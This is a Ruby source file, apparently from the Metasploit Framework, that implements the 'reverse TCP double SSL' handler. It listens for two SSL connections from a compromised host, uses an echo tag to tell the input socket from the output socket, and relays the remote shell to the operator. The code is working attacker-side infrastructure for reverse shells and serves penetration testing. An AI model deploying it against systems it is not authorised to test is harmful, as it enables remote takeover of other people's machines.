# -*- coding: binary -*-
module Msf
module Handler

###
#
# This module implements the reverse double TCP handler. This means
# that it listens on a port waiting for a two connections, one connection
# is treated as stdin, the other as stdout.
#
# This handler depends on having a local host and port to
# listen on.
#
###
module ReverseTcpDoubleSSL

  include Msf::Handler
  include Msf::Handler::Reverse
  include Msf::Handler::Reverse::Comm
  include Msf::Handler::Reverse::SSL

  #
  # Returns the string representation of the handler type, in this case
  # 'reverse_tcp_double'.
  #
  def self.handler_type
    return "reverse_tcp_double_ssl"
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'reverse'.
  #
  def self.general_handler_type
    "reverse"
  end

  #
  # Initializes the reverse TCP handler and adds the options that are required
  # for all reverse TCP payloads, like local host and local port.
  #
  def initialize(info = {})
    super

    register_advanced_options(
      [
        OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
      ], Msf::Handler::ReverseTcpDoubleSSL)

    self.conn_threads = []
  end

  # A string suitable for displaying to the user
  #
  # @return [String]
  def human_name
    "reverse TCP double SSL"
  end

  #
  # Starts the listener but does not actually attempt
  # to accept a connection.  Throws socket exceptions
  # if it fails to start the listener.
  #
  def setup_handler
    if !datastore['Proxies'].blank? && !datastore['ReverseAllowProxy']
      raise RuntimeError, 'TCP connect-back payloads cannot be used with Proxies. Can be overriden by setting ReverseAllowProxy to true'
    end

    ex = false

    comm = select_comm
    local_port = bind_port

    bind_addresses.each { |ip|
      begin

        self.listener_sock = Rex::Socket::SslTcpServer.create(
        'LocalHost' => ip,
        'LocalPort' => local_port,
        'Comm'      => comm,
        'SSLCert'   => datastore['HandlerSSLCert'],
        'Context'   =>
          {
            'Msf'        => framework,
            'MsfPayload' => self,
            'MsfExploit' => assoc_exploit
          })

        ex = false

        via = via_string_for_ip(ip, comm)

        print_status("Started reverse double SSL handler on #{ip}:#{local_port} #{via}")
        break
      rescue
        ex = $!
        print_error("Handler failed to bind to #{ip}:#{local_port}")
      end
    }
    raise ex if (ex)
  end

  #
  # Closes the listener socket if one was created.
  #
  def cleanup_handler
    stop_handler

    # Kill any remaining handle_connection threads that might
    # be hanging around
    conn_threads.each { |thr|
      thr.kill rescue nil
    }
  end

  #
  # Starts monitoring for an inbound connection.
  #
  def start_handler
    self.listener_thread = framework.threads.spawn("ReverseTcpDoubleSSLHandlerListener", false) {
      sock_inp = nil
      sock_out = nil

      begin
        # Accept two client connection
        begin
          client_a = self.listener_sock.accept
          print_status("Accepted the first client connection...")

          client_b = self.listener_sock.accept
          print_status("Accepted the second client connection...")
        rescue
          wlog("Exception raised during listener accept: #{$!}\n\n#{$@.join("\n")}")
          return nil
        end

        # Increment the has connection counter
        self.pending_connections += 1

        # Start a new thread and pass the client connection
        # as the input and output pipe.  Client's are expected
        # to implement the Stream interface.
        conn_threads << framework.threads.spawn("ReverseTcpDoubleSSLHandlerSession", false, client_a, client_b) { | client_a_copy, client_b_copy|
          begin
            sock_inp, sock_out = detect_input_output(client_a_copy, client_b_copy)
            chan = TcpReverseDoubleSSLSessionChannel.new(framework, sock_inp, sock_out)
            handle_connection(chan.lsock, { datastore: datastore })
          rescue
            elog("Exception raised from handle_connection: #{$!}\n\n#{$@.join("\n")}")
          end
        }
      end while true
    }
  end

  #
  # Accept two sockets and determine which one is the input and which
  # is the output. This method assumes that these sockets pipe to a
  # remote shell, it should overridden if this is not the case.
  #
  def detect_input_output(sock_a, sock_b)

    begin

      # Flush any pending socket data
      sock_a.get_once if sock_a.has_read_data?(0.25)
      sock_b.get_once if sock_b.has_read_data?(0.25)

      etag = Rex::Text.rand_text_alphanumeric(16)
      echo = "echo #{etag};\n"

      print_status("Command: #{echo.strip}")

      print_status("Writing to socket A")
      sock_a.put(echo)

      print_status("Writing to socket B")
      sock_b.put(echo)

      print_status("Reading from sockets...")

      resp_a = ''
      resp_b = ''

      if (sock_a.has_read_data?(1))
        print_status("Reading from socket A")
        resp_a = sock_a.get_once
        print_status("A: #{resp_a.inspect}")
      end

      if (sock_b.has_read_data?(1))
        print_status("Reading from socket B")
        resp_b = sock_b.get_once
        print_status("B: #{resp_b.inspect}")
      end

      print_status("Matching...")
      if (resp_b.match(etag))
        print_status("A is input...")
        return sock_a, sock_b
      else
        print_status("B is input...")
        return sock_b, sock_a
      end

    rescue ::Exception
      print_status("Caught exception in detect_input_output: #{$!}")
    end

  end

  #
  # Stops monitoring for an inbound connection.
  #
  def stop_handler
    # Terminate the listener thread
    if (self.listener_thread and self.listener_thread.alive? == true)
      self.listener_thread.kill
      self.listener_thread = nil
    end

    if (self.listener_sock)
      self.listener_sock.close
      self.listener_sock = nil
    end
  end

protected

  attr_accessor :listener_sock # :nodoc:
  attr_accessor :listener_thread # :nodoc:
  attr_accessor :conn_threads # :nodoc:


  module TcpReverseDoubleSSLChannelExt
    attr_accessor :localinfo
    attr_accessor :peerinfo
  end

  ###
  #
  # This class wrappers the communication channel built over the two inbound
  # connections, allowing input and output to be split across both.
  #
  ###
  class TcpReverseDoubleSSLSessionChannel

    include Rex::IO::StreamAbstraction

    def initialize(framework, inp, out)
      @framework = framework
      @sock_inp  = inp
      @sock_out  = out

      initialize_abstraction

      self.lsock.extend(TcpReverseDoubleSSLChannelExt)
      self.lsock.peerinfo  = @sock_inp.getpeername_as_array[1,2].map{|x| x.to_s}.join(":")
      self.lsock.localinfo = @sock_inp.getsockname[1,2].map{|x| x.to_s}.join(":")

      monitor_shell_stdout
    end

    #
    # Funnel data from the shell's stdout to +rsock+
    #
    # +StreamAbstraction#monitor_rsock+ will deal with getting data from
    # the client (user input).  From there, it calls our write() below,
    # funneling the data to the shell's stdin on the other side.
    #
    def monitor_shell_stdout

      # Start a thread to pipe data between stdin/stdout and the two sockets
      @monitor_thread = @framework.threads.spawn("ReverseTcpDoubleSSLHandlerMonitor", false) {
        begin
          while true
            # Handle data from the server and write to the client
            if (@sock_out.has_read_data?(0.50))
              buf = @sock_out.get_once
              break if buf.nil?
              rsock.put(buf)
            end
          end
        rescue ::Exception => e
          ilog("ReverseTcpDoubleSSL monitor thread raised #{e.class}: #{e}")
        end

        # Clean up the sockets...
        begin
          @sock_inp.close
          @sock_out.close
        rescue ::Exception
        end
      }
    end

    def write(buf, opts={})
      @sock_inp.write(buf, opts)
    end

    def read(length=0, opts={})
      @sock_out.read(length, opts)
    end

    #
    # Closes the stream abstraction and kills the monitor thread.
    #
    def close
      @monitor_thread.kill if (@monitor_thread)
      @monitor_thread = nil

      cleanup_abstraction
    end

  end


end

end
end
